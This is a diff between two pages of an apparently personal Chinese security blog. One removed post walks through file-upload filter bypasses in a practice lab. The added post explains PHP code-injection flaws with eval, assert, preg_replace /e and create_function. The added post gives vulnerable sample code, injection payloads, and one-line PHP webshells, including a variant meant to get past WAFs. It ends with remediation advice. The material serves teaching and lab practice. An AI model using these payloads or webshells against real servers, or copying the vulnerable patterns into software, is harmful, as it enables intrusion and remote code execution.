@@ -83,45 +83,26 @@
 
 
 
-<meta name="description" content="0x00:文件上传漏洞原理0x01:pass-01源码：根据提示客户端使用js对不合法图片进行检查，而源码只对文件后缀进行了校验，可通过抓包来改文件后缀名。将此处改为.php即可绕过。 0x02:pass-02源码：这题对数据包MIME进行检查，只过滤了文件类型，没有过滤文件后缀名。可以通过抓包修改Content-Type进行绕过。 0x03:pass-05源码：这题过滤了大部分文件名，但没有对文">
+<meta name="description" content="0x00 任意代码执行原理 当应用在调用一些能将字符串转化成代码的函数（如PHP中的eval）时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。广义上的代码注入，可以覆盖大半安全漏洞的分类。 0x01 代码执行漏">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传">
-<meta property="og:url" content="http://www.anonym1ty.cn/2018/08/16/文件上传/index.html">
+<meta property="og:title" content="任意代码执行">
+<meta property="og:url" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/index.html">
 <meta property="og:site_name" content="豆浆油条">
-<meta property="og:description" content="0x00:文件上传漏洞原理0x01:pass-01源码：根据提示客户端使用js对不合法图片进行检查，而源码只对文件后缀进行了校验，可通过抓包来改文件后缀名。将此处改为.php即可绕过。 0x02:pass-02源码：这题对数据包MIME进行检查，只过滤了文件类型，没有过滤文件后缀名。可以通过抓包修改Content-Type进行绕过。 0x03:pass-05源码：这题过滤了大部分文件名，但没有对文">
+<meta property="og:description" content="0x00 任意代码执行原理 当应用在调用一些能将字符串转化成代码的函数（如PHP中的eval）时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。广义上的代码注入，可以覆盖大半安全漏洞的分类。 0x01 代码执行漏">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/1.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/2.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/3.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/4.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/5.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/6.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/7.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/8.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/9.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/10.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/11.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/12.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/13.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/14.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/15.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/16.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/17.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/18.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/19.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/20.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/21.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/22.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/23.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/24.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/25.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/26.png">
-<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/27.png">
-<meta property="og:updated_time" content="2018-08-16T02:54:11.128Z">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/1.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/2.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/3.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/4.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/5.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/6.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/7.png">
+<meta property="og:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/8.png">
+<meta property="og:updated_time" content="2018-08-26T07:09:12.161Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="文件上传">
-<meta name="twitter:description" content="0x00:文件上传漏洞原理0x01:pass-01源码：根据提示客户端使用js对不合法图片进行检查，而源码只对文件后缀进行了校验，可通过抓包来改文件后缀名。将此处改为.php即可绕过。 0x02:pass-02源码：这题对数据包MIME进行检查，只过滤了文件类型，没有过滤文件后缀名。可以通过抓包修改Content-Type进行绕过。 0x03:pass-05源码：这题过滤了大部分文件名，但没有对文">
-<meta name="twitter:image" content="http://www.anonym1ty.cn/2018/08/16/文件上传/1.png">
+<meta name="twitter:title" content="任意代码执行">
+<meta name="twitter:description" content="0x00 任意代码执行原理 当应用在调用一些能将字符串转化成代码的函数（如PHP中的eval）时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。广义上的代码注入，可以覆盖大半安全漏洞的分类。 0x01 代码执行漏">
+<meta name="twitter:image" content="http://www.anonym1ty.cn/2018/08/17/任意代码执行/1.png">
 
 
 
@@ -151,14 +132,14 @@
 
 
 
-  <link rel="canonical" href="http://www.anonym1ty.cn/2018/08/16/文件上传/"/>
+  <link rel="canonical" href="http://www.anonym1ty.cn/2018/08/17/任意代码执行/"/>
 
 
 
 
 <link href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" rel="stylesheet">
 
-  <title>文件上传 | 豆浆油条</title>
+  <title>任意代码执行 | 豆浆油条</title>
   
 
 
@@ -299,7 +280,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.anonym1ty.cn/2018/08/16/文件上传/">
+    <link itemprop="mainEntityOfPage" href="http://www.anonym1ty.cn/2018/08/17/任意代码执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="豆浆油条">
@@ -316,7 +297,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">文件上传</h1>
+          <h1 class="post-title" itemprop="name headline">任意代码执行</h1>
         
 
         <div class="post-meta">
@@ -328,8 +309,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-16T10:29:00+08:00">
-                2018-08-16
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-17T23:30:00+08:00">
+                2018-08-17
               </time>
             
 
@@ -346,7 +327,7 @@
 
           
           
-             <span id="/2018/08/16/文件上传/" class="leancloud_visitors" data-flag-title="文件上传">
+             <span id="/2018/08/17/任意代码执行/" class="leancloud_visitors" data-flag-title="任意代码执行">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -371,7 +352,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  589
+                  1,737
                 </span>
               
 
@@ -396,14 +377,49 @@
       
 
       
-        <h1 id="0x00-文件上传漏洞原理"><a href="#0x00-文件上传漏洞原理" class="headerlink" title="0x00:文件上传漏洞原理"></a>0x00:文件上传漏洞原理</h1><h1 id="0x01-pass-01"><a href="#0x01-pass-01" class="headerlink" title="0x01:pass-01"></a>0x01:pass-01</h1><p>源码：<br><img src="/2018/08/16/文件上传/1.png" alt="截图"><br>根据提示客户端使用js对不合法图片进行检查，而源码只对文件后缀进行了校验，可通过抓包来改文件后缀名。<br><img src="/2018/08/16/文件上传/2.png" alt="截图"><br>将此处改为.php即可绕过。<br><img src="/2018/08/16/文件上传/3.png" alt="截图"></p>
-<h1 id="0x02-pass-02"><a href="#0x02-pass-02" class="headerlink" title="0x02:pass-02"></a>0x02:pass-02</h1><p>源码：<br><img src="/2018/08/16/文件上传/4.png" alt="截图"><br>这题对数据包MIME进行检查，只过滤了文件类型，没有过滤文件后缀名。可以通过抓包修改Content-Type进行绕过。<br><img src="/2018/08/16/文件上传/5.png" alt="截图"><br><img src="/2018/08/16/文件上传/6.png" alt="截图"></p>
-<h1 id="0x03-pass-05"><a href="#0x03-pass-05" class="headerlink" title="0x03:pass-05"></a>0x03:pass-05</h1><p>源码：<br><img src="/2018/08/16/文件上传/7.png" alt="截图"><br>这题过滤了大部分文件名，但没有对文件名后缀进行统一大小写。可以使用大小写绕过黑名单。即上传一个.phP文件即可。<br><img src="/2018/08/16/文件上传/8.png" alt="截图"></p>
-<h1 id="0X04-pass-06"><a href="#0X04-pass-06" class="headerlink" title="0X04:pass-06"></a>0X04:pass-06</h1><p>源码：<br><img src="/2018/08/16/文件上传/9.png" alt="截图"><br>本题未对尾部空格进行过滤，抓包在文件末尾添加空格即可绕过。<br><img src="/2018/08/16/文件上传/10.png" alt="截图"><br><img src="/2018/08/16/文件上传/11.png" alt="截图"></p>
-<h1 id="0x05-pass-07"><a href="#0x05-pass-07" class="headerlink" title="0x05:pass-07"></a>0x05:pass-07</h1><p>源码：<br><img src="/2018/08/16/文件上传/12.png" alt="截图"><br>这题题目没有去除文件后缀的点，由于windows文件后缀名只有点时会被去除，可以抓包加点绕过。<br><img src="/2018/08/16/文件上传/13.png" alt="截图"><br>在上传的文件夹下可以看到，文件名为.php后面的点被去除了。<br><img src="/2018/08/16/文件上传/14.png" alt="截图"><br><img src="/2018/08/16/文件上传/15.png" alt="截图"></p>
-<h1 id="0x06-pass-08"><a href="#0x06-pass-08" class="headerlink" title="0x06:pass-08"></a>0x06:pass-08</h1><p>源码：<br><img src="/2018/08/16/文件上传/16.png" alt="截图"><br>本题没有去除字符串::$DATA，抓包添加::$DATA即可绕过，即上传test8.php::$DATA之后会变成test8.php。<br><img src="/2018/08/16/文件上传/17.png" alt="截图"><br>上传后在upload文件夹下为<br><img src="/2018/08/16/文件上传/18.png" alt="截图"><br><img src="/2018/08/16/文件上传/19.png" alt="截图"></p>
-<h1 id="0x07-pass-09"><a href="#0x07-pass-09" class="headerlink" title="0x07:pass-09"></a>0x07:pass-09</h1><p>源码：<br><img src="/2018/08/16/文件上传/20.png" alt="截图"><br>本题虽然对大小写、点等都进行了过滤，缺不够严谨只过滤了一次，因此可以构造文件名为<br>Test9.php. .<br><img src="/2018/08/16/文件上传/21.png" alt="截图"><br><img src="/2018/08/16/文件上传/22.png" alt="截图"></p>
-<h1 id="0x08-pass-10"><a href="#0x08-pass-10" class="headerlink" title="0x08:pass-10"></a>0x08:pass-10</h1><p>源码：<br><img src="/2018/08/16/文件上传/23.png" alt="截图"><br>这题中<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>过滤了后缀名，可以通过构造后缀名为.pphphp来绕过。<br><img src="/2018/08/16/文件上传/24.png" alt="截图"><br>由于配置的环境问题，剩余的pass无法实现，这里对剩下的个人对文件上传的利用进行一些总结。<br>%00截断：<br>这类的文件上传通常可以通过构造文件名：文件名.php%00.jpg的方法绕过白名单的方式上传文件。<br>00截断：<br>截断的核心，就是chr(0)这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！ 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 。<br>使用抓包工具进行改包<br><img src="/2018/08/16/文件上传/25.png" alt="截图"><br>然后将+的hex值2b改为00<br><img src="/2018/08/16/文件上传/26.png" alt="截图"><br><img src="/2018/08/16/文件上传/27.png" alt="截图"><br>之后释放包即可</p>
+        <h1 id="0x00-任意代码执行原理"><a href="#0x00-任意代码执行原理" class="headerlink" title="0x00 任意代码执行原理"></a>0x00 任意代码执行原理</h1><p><ul></ul></p>
+<p><li><p>当应用在调用一些能将字符串转化成代码的函数（如PHP中的eval）时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如PHP的eval函数，可以将字符串代表的代码作为PHP代码执行，当用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。广义上的代码注入，可以覆盖大半安全漏洞的分类。<br></p></li></p><br><p></p>
+<h1 id="0x01-代码执行漏洞的常用函数"><a href="#0x01-代码执行漏洞的常用函数" class="headerlink" title="0x01 代码执行漏洞的常用函数"></a>0x01 代码执行漏洞的常用函数</h1><p>PHP:<code>eval,assert,preg_replace+/e模式</code><br>Javascript:<code>eval</code><br>Vbscript:<code>Execute,Eval</code><br>Python:<code>exec</code><br>Java:Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: <code>OGNL、SpEL、MVEL</code>等，这些都能够造成代码执行漏洞。<br>本文主要介绍php的常用函数。</p>
+<h1 id="0x02-php漏洞分类"><a href="#0x02-php漏洞分类" class="headerlink" title="0x02 php漏洞分类"></a>0x02 php漏洞分类</h1><p><ul></ul></p>
+<p><li><p><code>eval(),assert()</code></p></li></p><p></p>
+<p><li><p><code>preg_repalce + /e</code>模式<br></p></li></p><br><p></p>
+<h1 id="0x03-任意代码执行漏洞的利用"><a href="#0x03-任意代码执行漏洞的利用" class="headerlink" title="0x03 任意代码执行漏洞的利用"></a>0x03 任意代码执行漏洞的利用</h1><h2 id="eval-利用1"><a href="#eval-利用1" class="headerlink" title="eval()利用1"></a><code>eval()</code>利用1</h2><p>本地测试代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$ret = $data;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $ret;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>因为未对GET的参数进行过滤，通过eval可执行任意代码。<br><img src="/2018/08/17/任意代码执行/1.png" alt="截图"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payloda:</span><br><span class="line">?data=phpinfo()     或</span><br><span class="line">?data=1;phpinfo()</span><br></pre></td></tr></table></figure></p>
+<h2 id="eval-利用2"><a href="#eval-利用2" class="headerlink" title="eval()利用2"></a><code>eval()</code>利用2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$ret= '$data'"</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$ret = strtolower('$data');"</span>);</span><br><span class="line"><span class="keyword">echo</span> $ret;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 由于对传入参数直接进行回显，可以通过闭合单引号使eval奏效。<br> <img src="/2018/08/17/任意代码执行/2.png" alt="截图"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">       ?data=&apos;);phpinfo();//</span><br><span class="line">       ?data=&apos;);@eval($_POST[a]);//</span><br></pre></td></tr></table></figure></p>
+<h2 id="eval-利用3"><a href="#eval-利用3" class="headerlink" title="eval()利用3"></a><code>eval()</code>利用3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$ret = strtolower(\"$data\");"</span>);</span><br><span class="line"><span class="keyword">echo</span> $ret;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><li><p>PHP分析双引号中的数据是否含有变量（并解析它的值），当用双引号时,{}用来界定变量的界限。</p></li></p><p></p>
+<p><li><p>由于php中的变量名的格式为： $+变量名<br>变量名： 变量名是由字母，数字，下划线组成。<br>变量名除了直接写出来的“字母，数字，下划线”，也可以用变量代替，或者是某函数的返回值，只要返回值符合“字母，数字，下划线”即可。</p></li></p><p></p>
+<p><li><p>{}是“块”的意思，是为了防止php把函数名而加上的“定界符”。由于 phpinfo 是个比较特殊的函数.执行此函数,PHP 直接输出. 它的返回值是 bool</p></li></p><p><br><img src="/2018/08/17/任意代码执行/3.png" alt="截图"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">       ?data=&#123;$&#123;phpinfo()&#125;&#125;</span><br><span class="line">       ?data=$&#123;@eval($_POST[x])&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="assert-利用"><a href="#assert-利用" class="headerlink" title="assert()利用"></a><code>assert()</code>利用</h2><p><li><p>与eval类似，字符串被assert()当做PHP代码来执行。</p></li></p><br>例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">assert($_REQUEST[data]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">    ?data=phpinfo()</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/17/任意代码执行/4.png" alt="截图"></p>
+<h2 id="preg-replace-利用"><a href="#preg-replace-利用" class="headerlink" title="preg_replace()利用"></a><code>preg_replace()</code>利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+<p>搜索subject中匹配pattern部分，以replacement进行替换。</p>
+<p><li><p>preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码。</p></li></p><br>示例代码1：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@preg_replace(<span class="string">"/abc/e"</span>,$_REQUEST[<span class="string">'data'</span>],<span class="string">"abcd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">    ?data=phpinfo()</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/17/任意代码执行/5.png" alt="截图"><br>示例代码2：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line">preg_replace(<span class="string">'/&lt;data&gt;(.*)&lt;\/data&gt;/e'</span>, <span class="string">'$ret = "\\1";'</span>,$data);</span><br><span class="line"><span class="keyword">echo</span> $ret;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    注：PHP 5.5.0 /e 修饰符已经被弃用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">   ?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;</span><br><span class="line">   //由于PHP版本不同，也可能出现下面的payload</span><br><span class="line">   ?data=&lt;data&gt;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/17/任意代码执行/6.png" alt="截图"></p>
+<h2 id="create-function-利用"><a href="#create-function-利用" class="headerlink" title="create_function()利用"></a><code>create_function()</code>利用</h2><p><li><p>create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</p></li></p><br>代码示例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$func =create_function(<span class="string">''</span>,$_REQUEST[<span class="string">'data'</span>]);</span><br><span class="line">$func();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">    ?data=phpinfo();</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/17/任意代码执行/7.png" alt="截图"></p>
+<h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p><li><p>能使用json保存数组、对象就使用json格式，不要将php对象保存成字符串，否则读取的时候需要使用eval</p></li></p>
+<p><li><p>对于必须使用eval的情况，一定要保证用户不能轻易接触eval的参数（或者用正则判断输入的数据格式）</p></li></p>
+<p><li><p>对字符串，一定要使用单引号包裹可控制代码，并在插入前进行addslashes</p></li><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = addslashes($data); </span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$data = deal('$data');"</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p><li><p>放弃使用preg_replace的e修饰符</p></li></p>
+<p><li><p>使用preg_replace_callback()替换</p></li></p>
+<p><li><p>如果非要使用preg_replace()+e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹</p></li></p>
+<h1 id="0x05-危害"><a href="#0x05-危害" class="headerlink" title="0x05 危害"></a>0x05 危害</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><li><p>一句话木马</p></li></h2><p>###什么是一句话木马<br>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数种变形，但本质是不变的：木马的函数执行了我们发送的命令。</p>
+<p>###如何发送命令，发送的命令怎样执行<br>可以通过GET、POST、COOKIE这三种方式向一个网站提交数据，一句话木马用$_GET[‘’]、$_POST[‘’]、$_COOKIE[‘’]接受我们传递的数据，并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令。所以经典的一句话木马大多数都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分。举个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'dou'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>其中eval就是执行命令的函数，$_POST[‘a’]就是接收的数据。<br>eval函数把接收的数据当作php代码来执行。这样我们就能够让插了一句话木马的网站执行我们传递过去的任意php语句。<br>这里做一个简单的测试。先在test.php里写入一句话木马。<br><img src="/2018/08/17/任意代码执行/8.png" alt="截图"><br>因为木马是接收post请求中<code>dou</code>的数据($_POST[‘dou’]),所以必须以post方法发送数据并且将要执行的代码赋值给 <code>dou</code>。</p>
+<p>###其他制作一句话木马的函数<br>除了eval这个函数之外，肯定还有许多函数可以做到相同的功能，就比如assert。这个函数用法和eval一样，直接替换就行。这里介绍一些其他函数。</p>
+<p>####create_function()函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fun=create_function(<span class="string">''</span>,$_POST[<span class="string">'dou'</span>]);</span><br><span class="line">$fun();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>把用户传递的数据生成一个函数fun(),然后再执行fun().<br>使用方法与上面一样。</p>
+<p>####回调函数call_user_func():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@call_user_func(assert,$_POST[<span class="string">'dou'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>call_user_func这个函数可以调用其他函数，被调用的函数是call_user_func的第一个参数，被调用的函数的参数是call_user_func的第二个参数。这样的一个语句也可以完成一句话木马。一些被waf拦截的木马可以配合这个函数绕过waf。</p>
+<p>####preg_replace()函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">"/abcde/e"</span>,$_POST[<span class="string">'dou'</span>],<span class="string">"abcdefg"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能，可执行命令的功能。这个函数的第一个参数是正则表达式，按照php的格式，表达式在两个<code>&quot;/&quot;</code>之间。如果在这个表达式的末位加上<code>e</code>,那么这个函数的第二个参数就会被当做代码执行。</p>
 
       
     </div>
@@ -428,8 +444,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/16/宽字节注入/" rel="next" title="宽字节注入">
-                <i class="fa fa-chevron-left"></i> 宽字节注入
+              <a href="/2018/08/16/文件上传/" rel="next" title="文件上传">
+                <i class="fa fa-chevron-left"></i> 文件上传
               </a>
             
           </div>
@@ -438,8 +454,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/17/任意代码执行/" rel="prev" title="任意代码执行">
-                任意代码执行 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/26/浅谈php反序列化/" rel="prev" title="php反序列化">
+                php反序列化 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -604,7 +620,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-文件上传漏洞原理"><span class="nav-number">1.</span> <span class="nav-text">0x00:文件上传漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-pass-01"><span class="nav-number">2.</span> <span class="nav-text">0x01:pass-01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-pass-02"><span class="nav-number">3.</span> <span class="nav-text">0x02:pass-02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-pass-05"><span class="nav-number">4.</span> <span class="nav-text">0x03:pass-05</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X04-pass-06"><span class="nav-number">5.</span> <span class="nav-text">0X04:pass-06</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-pass-07"><span class="nav-number">6.</span> <span class="nav-text">0x05:pass-07</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-pass-08"><span class="nav-number">7.</span> <span class="nav-text">0x06:pass-08</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-pass-09"><span class="nav-number">8.</span> <span class="nav-text">0x07:pass-09</span></a></li><li class="nav-item 